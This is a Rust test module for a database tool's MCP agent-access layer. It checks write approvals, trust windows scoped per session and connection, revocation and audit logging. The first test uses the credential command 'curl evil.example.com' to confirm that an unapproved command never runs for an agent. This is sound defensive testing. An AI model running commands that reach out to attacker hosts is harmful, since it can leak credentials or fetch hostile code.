  async fn an_agent_cannot_vouch_for_a_credential_command() {
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = sqlite_state(&dir);
    let mut profile = state.profiles.lock().unwrap().get(&id).unwrap();
    profile.credential = crate::profiles::CredentialSource::Command {
      command: "curl evil.example.com".to_string(),
      refresh_after_secs: None,
    };
    state
      .profiles
      .lock()
      .unwrap()
      .replace_all(vec![profile])
      .unwrap();

    let Err(Error::Unsupported { message }) = agent_connection(&state, &id).await.map(|_| ())
    else {
      panic!("an unapproved command must not run for an agent");
    };
    assert!(message.contains("approve it in soquel first"), "{message}");
  }

  fn sqlite_state(dir: &tempfile::TempDir) -> (AppState, String) {
    let path = dir.path().join("agent.db");
    std::fs::write(&path, "").unwrap();
    let mut profiles = ProfileStore::load(dir.path().join("connections.json")).unwrap();
    let profile = profiles
      .create(&ConnectionInput {
        name: "agent sqlite".to_string(),
        env: Env::Dev,
        group: None,
        agent_access: AgentAccess::WriteWithApproval,
        credential: Default::default(),
        params: ConnectorParams::Sqlite {
          path: path.to_string_lossy().into_owned(),
        },
        password: None,
      })
      .unwrap();
    let state = AppState {
      profiles: std::sync::Mutex::new(profiles),
      tunnels: std::sync::Mutex::new(TunnelStore::load(dir.path().join("tunnels.json")).unwrap()),
      known_hosts: std::sync::Mutex::new(
        KnownHostsStore::load(dir.path().join("known_hosts.json")).unwrap(),
      ),
      command_approvals: std::sync::Mutex::new(
        crate::command_approvals::CommandApprovalsStore::load(
          dir.path().join("command_approvals.json"),
        )
        .unwrap(),
      ),
      secrets: Box::new(InMemoryStore::default()),
      secrets_problem: None,
      session_secrets: Default::default(),
      connections: tokio::sync::Mutex::new(HashMap::new()),
      sessions: tokio::sync::Mutex::new(HashMap::new()),
      data_dir: dir.path().to_path_buf(),
      mcp: tokio::sync::Mutex::new(None),
      approvals: tokio::sync::Mutex::new(HashMap::new()),
      trust_windows: tokio::sync::Mutex::new(HashMap::new()),
    };
    (state, profile.id)
  }

  fn sql(id: &str, sql: &str) -> QueryArgs {
    QueryArgs {
      connection_id: id.to_string(),
      sql: sql.to_string(),
    }
  }

  /// A second sqlite connection in the same store, also opted in for writes.
  fn second_connection(state: &AppState, dir: &tempfile::TempDir) -> String {
    let path = dir.path().join("other.db");
    std::fs::write(&path, "").unwrap();
    state
      .profiles
      .lock()
      .unwrap()
      .create(&ConnectionInput {
        name: "other sqlite".to_string(),
        env: Env::Dev,
        group: None,
        agent_access: AgentAccess::WriteWithApproval,
        credential: Default::default(),
        params: ConnectorParams::Sqlite {
          path: path.to_string_lossy().into_owned(),
        },
        password: None,
      })
      .unwrap()
      .id
  }

  #[tokio::test]
  async fn a_trust_window_covers_later_writes_on_the_same_connection() {
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = sqlite_state(&dir);
    let approver = WindowApprover::default();

    let mut first = AgentCall::new("session-a", &approver);
    run_query_impl(
      &state,
      &mut first,
      &sql(&id, "CREATE TABLE one (id integer)"),
    )
    .await
    .unwrap();
    assert_eq!(first.approval, Some(Approval::Asked));
    assert_eq!(approver.asked(), 1);

    let mut second = AgentCall::new("session-a", &approver);
    run_query_impl(
      &state,
      &mut second,
      &sql(&id, "CREATE TABLE two (id integer)"),
    )
    .await
    .unwrap();
    // The point of the whole feature: no second dialog, and the log says so.
    assert_eq!(approver.asked(), 1);
    assert_eq!(second.approval, Some(Approval::Covered));
  }

  #[tokio::test]
  async fn a_trust_window_covers_neither_another_connection_nor_another_session() {
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = sqlite_state(&dir);
    let other = second_connection(&state, &dir);
    let approver = WindowApprover::default();

    let mut opening = AgentCall::new("session-a", &approver);
    run_query_impl(
      &state,
      &mut opening,
      &sql(&id, "CREATE TABLE one (id integer)"),
    )
    .await
    .unwrap();
    assert_eq!(approver.asked(), 1);

    // Same session, another connection: staging must not cover prod.
    let mut across = AgentCall::new("session-a", &approver);
    run_query_impl(
      &state,
      &mut across,
      &sql(&other, "CREATE TABLE two (id integer)"),
    )
    .await
    .unwrap();
    assert_eq!(approver.asked(), 2);
    assert_eq!(across.approval, Some(Approval::Asked));

    // Another agent on the same connection inherits nothing.
    let mut stranger = AgentCall::new("session-b", &approver);
    run_query_impl(
      &state,
      &mut stranger,
      &sql(&id, "CREATE TABLE three (id integer)"),
    )
    .await
    .unwrap();
    assert_eq!(approver.asked(), 3);
    assert_eq!(stranger.approval, Some(Approval::Asked));
  }

  #[tokio::test]
  async fn an_expired_window_asks_again() {
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = sqlite_state(&dir);
    let past = Instant::now()
      .checked_sub(std::time::Duration::from_secs(1))
      .expect("a monotonic clock a second past boot");
    state.trust_windows.lock().await.insert(
      ("session-a".to_string(), id.clone()),
      TrustWindow {
        expires: past,
        expires_at_ms: 0.0,
        connection_name: "agent sqlite".to_string(),
      },
    );

    // Answers once without re-opening a window, so the stale entry is the only
    // thing that could have covered this write.
    let approver = FixedApprover(true);
    let mut call = AgentCall::new("session-a", &approver);
    run_query_impl(
      &state,
      &mut call,
      &sql(&id, "CREATE TABLE one (id integer)"),
    )
    .await
    .unwrap();
    assert_eq!(call.approval, Some(Approval::Asked));
    // And it is dropped rather than lingering in the panel.
    assert!(trust_windows(&state).await.is_empty());
  }

  #[tokio::test]
  async fn losing_write_access_beats_a_live_window() {
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = sqlite_state(&dir);
    let approver = WindowApprover::default();

    let mut opening = AgentCall::new("session-a", &approver);
    run_query_impl(
      &state,
      &mut opening,
      &sql(&id, "CREATE TABLE one (id integer)"),
    )
    .await
    .unwrap();
    assert_eq!(trust_windows(&state).await.len(), 1);

    {
      let mut profiles = state.profiles.lock().unwrap();
      let profile = profiles.get(&id).unwrap();
      let input = ConnectionInput {
        name: profile.name.clone(),
        env: profile.env,
        group: profile.group.clone(),
        agent_access: AgentAccess::ReadOnly,
        credential: profile.credential.clone(),
        params: profile.params.clone(),
        password: None,
      };
      profiles.update(&id, &input).unwrap();
    }

    // The access check runs before the window, so a downgrade takes effect at
    // once and revoking access never has to hunt down open windows.
    let mut after = AgentCall::new("session-a", &approver);
    let err = run_query_impl(
      &state,
      &mut after,
      &sql(&id, "CREATE TABLE two (id integer)"),
    )
    .await
    .unwrap_err();
    let Error::Unsupported { message } = err else {
      panic!("expected unsupported: {err:?}");
    };
    assert!(message.contains("read-only for agents"), "{message}");
  }

  #[tokio::test]
  async fn a_window_is_revocable_and_dies_with_the_server() {
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = sqlite_state(&dir);
    let approver = WindowApprover::default();
    let open = |session: &'static str| {
      let approver = &approver;
      let state = &state;
      let id = id.clone();
      async move {
        let mut call = AgentCall::new(session, approver);
        run_query_impl(state, &mut call, &sql(&id, "SELECT 1"))
          .await
          .unwrap();
        let mut call = AgentCall::new(session, approver);
        run_query_impl(
          state,
          &mut call,
          &sql(&id, &format!("CREATE TABLE t_{session} (id integer)")),
        )
        .await
        .unwrap();
      }
    };
    open("a").await;
    open("b").await;
    let listed = trust_windows(&state).await;
    assert_eq!(listed.len(), 2);
    assert!(listed.iter().all(|w| w.connection_name == "agent sqlite"));

    revoke_trust(&state, "a", &id).await;
    let left = trust_windows(&state).await;
    assert_eq!(left.len(), 1);
    assert_eq!(left[0].session, "b");

    // The sessions those windows belonged to end with the server.
    stop(&state).await.unwrap();
    assert!(trust_windows(&state).await.is_empty());
  }

  #[tokio::test(flavor = "multi_thread")]
  async fn two_writes_wait_on_approval_at_the_same_time() {
    use std::sync::atomic::Ordering;

    let dir = tempfile::tempdir().unwrap();
    let (state, id) = sqlite_state(&dir);
    let approver = CountingApprover {
      inside: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
      peak: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
      release: Arc::new(tokio::sync::Notify::new()),
    };
    let first_args = QueryArgs {
      connection_id: id.clone(),
      sql: "CREATE TABLE one (id integer)".to_string(),
    };
    let second_args = QueryArgs {
      connection_id: id.clone(),
      sql: "CREATE TABLE two (id integer)".to_string(),
    };

    // Nothing in the request path may hold a lock across the approval await.
    let mut first_call = call(&approver);
    let mut second_call = call(&approver);
    let both = tokio::join!(
      run_query_impl(&state, &mut first_call, &first_args),
      async {
        while approver.inside.load(Ordering::SeqCst) == 0 {
          tokio::time::sleep(std::time::Duration::from_millis(5)).await;
        }
        let second = run_query_impl(&state, &mut second_call, &second_args);
        let releaser = async {
          while approver.inside.load(Ordering::SeqCst) < 2 {
            tokio::time::sleep(std::time::Duration::from_millis(5)).await;
          }
          approver.release.notify_waiters();
          approver.release.notify_waiters();
        };
        let (result, ()) = tokio::join!(second, releaser);
        result
      }
    );
    assert_eq!(approver.peak.load(Ordering::SeqCst), 2);
    both.0.unwrap();
    both.1.unwrap();
  }

  #[tokio::test]
  async fn audit_log_reads_newest_first_and_survives_junk() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    assert!(audit_log(&state, 10).unwrap().is_empty());

    for tool in ["first", "second"] {
      audit(
        &state,
        tool,
        None,
        Some("conn"),
        Some("SELECT 1"),
        &Ok(serde_json::Value::Null),
        Instant::now(),
      );
    }
    std::fs::OpenOptions::new()
      .append(true)
      .open(dir.path().join("mcp-audit.jsonl"))
      .and_then(|mut file| writeln!(file, "not json"))
      .unwrap();
    audit(
      &state,
      "third",
      None,
      None,
      None,
      &Err(Error::Unsupported {
        message: "the write was not approved".to_string(),
      }),
      Instant::now(),
    );

    let entries = audit_log(&state, 10).unwrap();
    let tools: Vec<&str> = entries.iter().map(|entry| entry.tool.as_str()).collect();
    assert_eq!(tools, ["third", "second", "first"]);
    assert!(!entries[0].ok);
    assert_eq!(
      entries[0].error.as_deref(),
      Some("the write was not approved")
    );
    assert_eq!(audit_log(&state, 1).unwrap().len(), 1);
  }

  /// One opted-in profile against a non-SQL engine, keyed by its params.
  async fn kind_state(
    dir: &tempfile::TempDir,
    params: ConnectorParams,
    access: AgentAccess,
  ) -> (AppState, String) {
    let mut profiles = ProfileStore::load(dir.path().join("connections.json")).unwrap();
    let profile = profiles
      .create(&ConnectionInput {
        name: "agent target".to_string(),
        env: Env::Dev,
        group: None,
        agent_access: access,
        credential: Default::default(),
        params,
        password: None,
      })
      .unwrap();
    let secrets = InMemoryStore::default();
    secrets
      .set(&SecretKey::Connection(profile.id.clone()), "soquel")
      .unwrap();
    let state = AppState {
      profiles: std::sync::Mutex::new(profiles),
      tunnels: std::sync::Mutex::new(TunnelStore::load(dir.path().join("tunnels.json")).unwrap()),
      known_hosts: std::sync::Mutex::new(
        KnownHostsStore::load(dir.path().join("known_hosts.json")).unwrap(),
      ),
      command_approvals: std::sync::Mutex::new(
        crate::command_approvals::CommandApprovalsStore::load(
          dir.path().join("command_approvals.json"),
        )
        .unwrap(),
      ),
      secrets: Box::new(secrets),
      secrets_problem: None,
      session_secrets: Default::default(),
      connections: tokio::sync::Mutex::new(HashMap::new()),
      sessions: tokio::sync::Mutex::new(HashMap::new()),
      data_dir: dir.path().to_path_buf(),
      mcp: tokio::sync::Mutex::new(None),
      approvals: tokio::sync::Mutex::new(HashMap::new()),
      trust_windows: tokio::sync::Mutex::new(HashMap::new()),
    };
    (state, profile.id)
  }

  /// Upgrade a live profile in place, the way the form does.
  fn allow_writes(state: &AppState, id: &str) {
    let mut profiles = state.profiles.lock().unwrap();
    let profile = profiles.get(id).unwrap();
    let input = ConnectionInput {
      name: profile.name.clone(),
      env: profile.env,
      group: profile.group.clone(),
      agent_access: AgentAccess::WriteWithApproval,
      credential: profile.credential.clone(),
      params: profile.params.clone(),
      password: None,
    };
    profiles.update(id, &input).unwrap();
  }

  #[tokio::test]
  async fn integration_mcp_kv_tools_read_redis() {
    let Ok(addr) = std::env::var("SOQUEL_TEST_REDIS") else {
      return;
    };
    let (host, port) = addr.split_once(':').expect("host:port");
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = kind_state(
      &dir,
      ConnectorParams::Redis(crate::profiles::RedisParams {
        host: host.to_string(),
        port: port.parse().unwrap(),
        db: 0,
        username: None,
        tls: false,
        tunnel_id: None,
      }),
      AgentAccess::ReadOnly,
    )
    .await;

    // Seed through the app's own surface, then read it back as an agent would.
    let connection = agent_connection(&state, &id).await.unwrap();
    connection
      .kv()
      .unwrap()
      .set_string("soquel_test:mcp:key", "hello")
      .await
      .unwrap();

    let databases = list_databases_impl(
      &state,
      &ConnectionArgs {
        connection_id: id.clone(),
      },
    )
    .await
    .unwrap();
    assert!(databases["total"].as_u64().unwrap() >= 1, "{databases}");

    let page = list_keys_impl(
      &state,
      &KeyScanArgs {
        connection_id: id.clone(),
        pattern: Some("soquel_test:mcp:*".to_string()),
        cursor: None,
        count: None,
      },
    )
    .await
    .unwrap();
    let names: Vec<&str> = page["keys"]
      .as_array()
      .unwrap()
      .iter()
      .map(|key| key["key"].as_str().unwrap())
      .collect();
    assert!(names.contains(&"soquel_test:mcp:key"), "{page}");

    let detail = get_key_impl(
      &state,
      &KeyArgs {
        connection_id: id.clone(),
        key: "soquel_test:mcp:key".to_string(),
      },
    )
    .await
    .unwrap();
    assert_eq!(detail["key"], "soquel_test:mcp:key");
    assert_eq!(detail["value"]["kind"], "string");
    assert_eq!(detail["value"]["value"], "hello");

    // SQL tools refuse a key-value connection instead of half-working.
    let err = get_schema_impl(
      &state,
      &ConnectionArgs {
        connection_id: id.clone(),
      },
    )
    .await
    .unwrap_err();
    assert!(matches!(err, Error::Unsupported { .. }), "{err:?}");

    connection
      .kv()
      .unwrap()
      .delete_key("soquel_test:mcp:key")
      .await
      .unwrap();
  }

  #[tokio::test]
  async fn integration_mcp_kv_writes_need_approval() {
    let Ok(addr) = std::env::var("SOQUEL_TEST_REDIS") else {
      return;
    };
    let (host, port) = addr.split_once(':').expect("host:port");
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = kind_state(
      &dir,
      ConnectorParams::Redis(crate::profiles::RedisParams {
        host: host.to_string(),
        port: port.parse().unwrap(),
        db: 0,
        username: None,
        tls: false,
        tunnel_id: None,
      }),
      AgentAccess::ReadOnly,
    )
    .await;
    let key = "soquel_test:mcp:write";
    let set = |value: &str| KeySetArgs {
      connection_id: id.clone(),
      key: key.to_string(),
      value: value.to_string(),
    };
    // None = the key is absent; a missing key is a NotFound, not an empty read.
    let read_back = || async {
      match get_key_impl(
        &state,
        &KeyArgs {
          connection_id: id.clone(),
          key: key.to_string(),
        },
      )
      .await
      {
        Ok(detail) => Some(detail["value"]["value"].as_str().unwrap().to_string()),
        Err(Error::NotFound { .. }) => None,
        Err(err) => panic!("unexpected read failure: {err:?}"),
      }
    };

    // read-only never reaches the approver, whatever it would answer.
    let err = set_key_impl(&state, &mut call(&FixedApprover(true)), &set("leak"))
      .await
      .unwrap_err();
    let Error::Unsupported { message } = err else {
      panic!("expected unsupported: {err:?}");
    };
    assert!(message.contains("read-only for agents"), "{message}");

    allow_writes(&state, &id);

    let denied = set_key_impl(&state, &mut call(&DenyingApprover), &set("denied"))
      .await
      .unwrap_err();
    let Error::Unsupported { message } = denied else {
      panic!("expected unsupported: {denied:?}");
    };
    assert!(message.contains("not approved"), "{message}");
    // Denial means nothing ran: the key was never created.
    assert_eq!(read_back().await, None);

    set_key_impl(&state, &mut call(&FixedApprover(true)), &set("approved"))
      .await
      .unwrap();
    assert_eq!(read_back().await.as_deref(), Some("approved"));

    // A TTL is a write of its own, and it is approved on its own.
    set_ttl_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &KeyTtlArgs {
        connection_id: id.clone(),
        key: key.to_string(),
        ttl_ms: Some(60_000.0),
      },
    )
    .await
    .unwrap();
    let detail = get_key_impl(
      &state,
      &KeyArgs {
        connection_id: id.clone(),
        key: key.to_string(),
      },
    )
    .await
    .unwrap();
    assert!(detail["ttlMs"].as_f64().unwrap() > 0.0, "{detail}");

    let refused = delete_key_impl(
      &state,
      &mut call(&DenyingApprover),
      &KeyArgs {
        connection_id: id.clone(),
        key: key.to_string(),
      },
    )
    .await
    .unwrap_err();
    assert!(matches!(refused, Error::Unsupported { .. }), "{refused:?}");
    assert_eq!(read_back().await.as_deref(), Some("approved"));

    delete_key_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &KeyArgs {
        connection_id: id.clone(),
        key: key.to_string(),
      },
    )
    .await
    .unwrap();
    assert_eq!(read_back().await, None);

    // The batch this whole feature exists for: a window opened by one kv tool
    // covers the next one, so cleaning N keys asks once instead of N times.
    let approver = WindowApprover::default();
    let mut opening = AgentCall::new("session-batch", &approver);
    set_key_impl(&state, &mut opening, &set("batched"))
      .await
      .unwrap();
    assert_eq!(opening.approval, Some(Approval::Asked));

    let mut covered = AgentCall::new("session-batch", &approver);
    delete_key_impl(
      &state,
      &mut covered,
      &KeyArgs {
        connection_id: id.clone(),
        key: key.to_string(),
      },
    )
    .await
    .unwrap();
    assert_eq!(approver.asked(), 1, "a second kv write must not ask again");
    assert_eq!(covered.approval, Some(Approval::Covered));
    assert_eq!(read_back().await, None);
    revoke_trust(&state, "session-batch", &id).await;
  }

  #[tokio::test]
  async fn integration_mcp_doc_tools_read_mongo() {
    let Ok(addr) = std::env::var("SOQUEL_TEST_MONGO") else {
      return;
    };
    let (host, port) = addr.split_once(':').expect("host:port");
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = kind_state(
      &dir,
      ConnectorParams::Mongo(crate::profiles::MongoParams {
        host: host.to_string(),
        port: port.parse().unwrap(),
        database: None,
        username: Some("soquel".to_string()),
        auth_source: None,
        tls: false,
        tunnel_id: None,
      }),
      AgentAccess::ReadOnly,
    )
    .await;

    // The compose mongo seeds soquel_e2e for the e2e spec; read that.
    let databases = list_databases_impl(
      &state,
      &ConnectionArgs {
        connection_id: id.clone(),
      },
    )
    .await
    .unwrap();
    let names: Vec<&str> = databases
      .as_array()
      .unwrap()
      .iter()
      .map(|db| db["name"].as_str().unwrap())
      .collect();
    assert!(names.contains(&"soquel_e2e"), "{databases}");

    let collections = list_collections_impl(
      &state,
      &DatabaseArgs {
        connection_id: id.clone(),
        database: "soquel_e2e".to_string(),
      },
    )
    .await
    .unwrap();
    let collection = collections.as_array().unwrap()[0]["name"]
      .as_str()
      .unwrap()
      .to_string();

    let page = find_documents_impl(
      &state,
      &DocFindArgs {
        connection_id: id.clone(),
        database: "soquel_e2e".to_string(),
        collection: collection.clone(),
        filter: None,
        sort: None,
        limit: Some(3),
        cursor: None,
      },
    )
    .await
    .unwrap();
    assert!(!page["docs"].as_array().unwrap().is_empty(), "{page}");

    let count = count_documents_impl(
      &state,
      &DocCountArgs {
        connection_id: id.clone(),
        database: "soquel_e2e".to_string(),
        collection: collection.clone(),
        filter: None,
      },
    )
    .await
    .unwrap();
    assert!(count["count"].as_f64().unwrap() >= 1.0, "{count}");

    let indexes = list_indexes_impl(
      &state,
      &CollectionArgs {
        connection_id: id.clone(),
        database: "soquel_e2e".to_string(),
        collection,
      },
    )
    .await
    .unwrap();
    assert!(!indexes.as_array().unwrap().is_empty(), "{indexes}");
  }

  #[tokio::test]
  async fn integration_mcp_doc_writes_need_approval() {
    let Ok(addr) = std::env::var("SOQUEL_TEST_MONGO") else {
      return;
    };
    let (host, port) = addr.split_once(':').expect("host:port");
    // Its own database: soquel_e2e belongs to the e2e spec and must stay untouched.
    let db_name = "soquel_test_mcp_writes";
    let uri = format!("mongodb://soquel:soquel@{host}:{port}/?directConnection=true");
    let client = mongodb::Client::with_uri_str(&uri).await.unwrap();
    let raw = client.database(db_name);
    raw.drop().await.unwrap();
    raw
      .collection::<mongodb::bson::Document>("docs")
      .insert_one(mongodb::bson::doc! { "_id": "probe", "state": "before" })
      .await
      .unwrap();

    let dir = tempfile::tempdir().unwrap();
    let (state, id) = kind_state(
      &dir,
      ConnectorParams::Mongo(crate::profiles::MongoParams {
        host: host.to_string(),
        port: port.parse().unwrap(),
        database: None,
        username: Some("soquel".to_string()),
        auth_source: None,
        tls: false,
        tunnel_id: None,
      }),
      AgentAccess::ReadOnly,
    )
    .await;

    let find = || async {
      find_documents_impl(
        &state,
        &DocFindArgs {
          connection_id: id.clone(),
          database: db_name.to_string(),
          collection: "docs".to_string(),
          filter: None,
          sort: None,
          limit: None,
          cursor: None,
        },
      )
      .await
      .unwrap()
    };

    // The agent addresses a document by the id find_documents handed it.
    let page = find().await;
    let doc_id = page["docs"][0]["id"].as_str().unwrap().to_string();
    let replace = |body: &str| DocReplaceArgs {
      connection_id: id.clone(),
      database: db_name.to_string(),
      collection: "docs".to_string(),
      id: doc_id.clone(),
      document: body.to_string(),
    };

    // read-only never reaches the approver, whatever it would answer.
    let err = replace_document_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &replace(r#"{"_id":"probe","state":"leak"}"#),
    )
    .await
    .unwrap_err();
    let Error::Unsupported { message } = err else {
      panic!("expected unsupported: {err:?}");
    };
    assert!(message.contains("read-only for agents"), "{message}");

    allow_writes(&state, &id);

    let denied = replace_document_impl(
      &state,
      &mut call(&DenyingApprover),
      &replace(r#"{"_id":"probe","state":"denied"}"#),
    )
    .await
    .unwrap_err();
    let Error::Unsupported { message } = denied else {
      panic!("expected unsupported: {denied:?}");
    };
    assert!(message.contains("not approved"), "{message}");
    assert!(
      find().await["docs"][0]["doc"]
        .as_str()
        .unwrap()
        .contains("before"),
      "a denied replace must leave the document alone"
    );

    replace_document_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &replace(r#"{"_id":"probe","state":"after"}"#),
    )
    .await
    .unwrap();
    assert!(find().await["docs"][0]["doc"]
      .as_str()
      .unwrap()
      .contains("after"));

    let delete = DocIdArgs {
      connection_id: id.clone(),
      database: db_name.to_string(),
      collection: "docs".to_string(),
      id: doc_id.clone(),
    };
    let refused = delete_document_impl(&state, &mut call(&DenyingApprover), &delete)
      .await
      .unwrap_err();
    assert!(matches!(refused, Error::Unsupported { .. }), "{refused:?}");
    assert_eq!(find().await["docs"].as_array().unwrap().len(), 1);

    delete_document_impl(&state, &mut call(&FixedApprover(true)), &delete)
      .await
      .unwrap();
    assert!(find().await["docs"].as_array().unwrap().is_empty());

    raw.drop().await.unwrap();
  }

  #[tokio::test]
  async fn integration_mcp_write_needs_approval() {
    let Ok(url) = std::env::var("SOQUEL_TEST_PG") else {
      return;
    };
    let dir = tempfile::tempdir().unwrap();
    let (state, read_only, _hidden) = test_state(&dir, &url);
    let write = |sql: &str| QueryArgs {
      connection_id: read_only.clone(),
      sql: sql.to_string(),
    };

    // read-only never reaches the approver, whatever it would answer.
    let err = run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &write("CREATE TABLE app.leak (id int)"),
    )
    .await
    .unwrap_err();
    let Error::Unsupported { message } = err else {
      panic!("expected unsupported: {err:?}");
    };
    assert!(message.contains("read-only for agents"), "{message}");

    // Same profile, upgraded to write-with-approval.
    {
      let mut profiles = state.profiles.lock().unwrap();
      let input = crate::profiles::ConnectionInput {
        name: "agent-visible".to_string(),
        env: Env::Dev,
        group: None,
        agent_access: AgentAccess::WriteWithApproval,
        credential: Default::default(),
        params: pg_params(&url),
        password: None,
      };
      profiles.update(&read_only, &input).unwrap();
    }

    let denied = run_query_impl(
      &state,
      &mut call(&DenyingApprover),
      &write("CREATE TABLE app.denied (id int)"),
    )
    .await
    .unwrap_err();
    let Error::Unsupported { message } = denied else {
      panic!("expected unsupported: {denied:?}");
    };
    assert!(message.contains("not approved"), "{message}");
    // Denial means nothing ran.
    let missing = run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &write("SELECT to_regclass('app.denied') IS NULL AS absent"),
    )
    .await
    .unwrap();
    assert_eq!(missing["result"]["statements"][0]["rows"][0][0], "t");

    // Approved: the write lands, outside the read-only path.
    run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &write("CREATE TABLE app.approved_probe (id int)"),
    )
    .await
    .unwrap();
    let exists = run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &write("SELECT to_regclass('app.approved_probe') IS NOT NULL AS there"),
    )
    .await
    .unwrap();
    assert_eq!(exists["result"]["statements"][0]["rows"][0][0], "t");
    run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &write("DROP TABLE app.approved_probe"),
    )
    .await
    .unwrap();

    // A kv write on a SQL connection dies on the missing surface, before the
    // approver: an approving one is here to prove no dialog was ever raised for
    // an operation this connection cannot run.
    let wrong_kind = set_key_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &KeySetArgs {
        connection_id: read_only.clone(),
        key: "app:probe".to_string(),
        value: "v".to_string(),
      },
    )
    .await
    .unwrap_err();
    let Error::Unsupported { message } = wrong_kind else {
      panic!("expected unsupported: {wrong_kind:?}");
    };
    assert!(message.contains("not a key-value store"), "{message}");

    let wrong_doc = delete_document_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &DocIdArgs {
        connection_id: read_only.clone(),
        database: "app".to_string(),
        collection: "customers".to_string(),
        id: "1".to_string(),
      },
    )
    .await
    .unwrap_err();
    let Error::Unsupported { message } = wrong_doc else {
      panic!("expected unsupported: {wrong_doc:?}");
    };
    assert!(message.contains("not a document store"), "{message}");
  }
}
